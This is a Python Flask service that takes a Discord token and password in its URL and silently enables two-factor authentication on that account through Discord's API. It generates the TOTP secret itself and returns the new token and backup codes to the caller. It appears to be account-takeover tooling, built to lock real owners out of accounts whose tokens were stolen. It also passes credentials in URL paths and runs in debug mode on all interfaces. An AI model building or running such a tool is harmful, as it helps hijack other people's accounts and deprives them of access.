from flask import Flask, request, jsonify
import requests
import pyotp
import json

app = Flask(__name__)

@app.route('/api/enable/<token>/<password>', methods=['GET'])
def discordf2fa(token, password):
    try:
        headers = {
            'Authorization': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        user_info = requests.get(
            'https://discord.com/api/v9/users/@me',
            headers=headers,
            timeout=10
        )

        if user_info.status_code == 403:
            return jsonify({
                'status_code': 403,
                'message': 'Invalid token or unauthorized'
            }), 403

        if user_info.status_code != 200:
            return jsonify({
                'status_code': user_info.status_code,
                'message': user_info.text
            }), user_info.status_code

        user_info = user_info.json()

        user_id = user_info.get('id')
        avatar_hash = user_info.get('avatar')
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png" if avatar_hash else ""

        secretkey = pyotp.random_base32()
        code = pyotp.TOTP(secretkey)
        
        parametros = {
            "password": password,
            "secret": secretkey,
            "code": code.now()
        }
        
        # Enable 2FA
        req_add2fa = requests.post(
            'https://discord.com/api/v9/users/@me/mfa/totp/enable',
            json=parametros,
            headers=headers,
            timeout=10
        )

        if req_add2fa.status_code == 400:
            captcha_data = req_add2fa.json()
            if 'captcha_sitekey' in captcha_data:
                return jsonify({
                    'status_code': 400,
                    'message': 'CAPTCHA required',
                    'captcha_data': captcha_data
                }), 400

        if req_add2fa.status_code != 200:
            return jsonify({
                'status_code': req_add2fa.status_code,
                'message': req_add2fa.text
            }), req_add2fa.status_code

        req_add2fajson = req_add2fa.json()
        
        token2fa = req_add2fajson.get('token')
        backup_codes = req_add2fajson.get('backup_codes', [])
        formatted_backup_codes = [code['code'] for code in backup_codes]

        return jsonify({
            'new_token': token2fa,
            'backup_codes': formatted_backup_codes
        }), 200

    except Exception as e:
        return f"Error: {str(e)}", 400

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port="5000")